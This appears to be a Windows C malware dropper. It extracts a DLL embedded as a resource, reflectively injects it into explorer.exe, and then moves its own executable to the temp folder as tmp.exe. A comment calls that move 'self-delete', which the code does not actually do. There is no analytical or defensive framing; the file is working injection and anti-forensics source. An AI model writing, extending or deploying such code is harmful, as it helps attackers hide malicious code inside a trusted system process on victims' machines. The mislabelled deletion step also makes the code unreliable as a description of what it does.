#include <windows.h>
#include "src/injection/reflective_loader.h"

// Resource ID for the DLL
#define IDR_DLL1 101

int main() {
    // Load the DLL from resources
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), RT_RCDATA);
    if (hRes == NULL) {
        return 1;
    }

    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (hResLoad == NULL) {
        return 1;
    }

    LPVOID pDllBuffer = LockResource(hResLoad);
    if (pDllBuffer == NULL) {
        return 1;
    }

    // Inject the DLL into explorer.exe
    if (ReflectiveLoader::FindAndInject("explorer.exe", pDllBuffer)) {
        // Self-delete
        char szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, MAX_PATH)) {
            HANDLE hFile = CreateFile(szPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                // Rename the file to a temporary name
                TCHAR szTmp[MAX_PATH];
                GetTempPath(MAX_PATH, szTmp);
                lstrcat(szTmp, TEXT("tmp.exe"));
                MoveFile(szPath, szTmp);
                CloseHandle(hFile);
            }
        }
    }

    return 0;
}
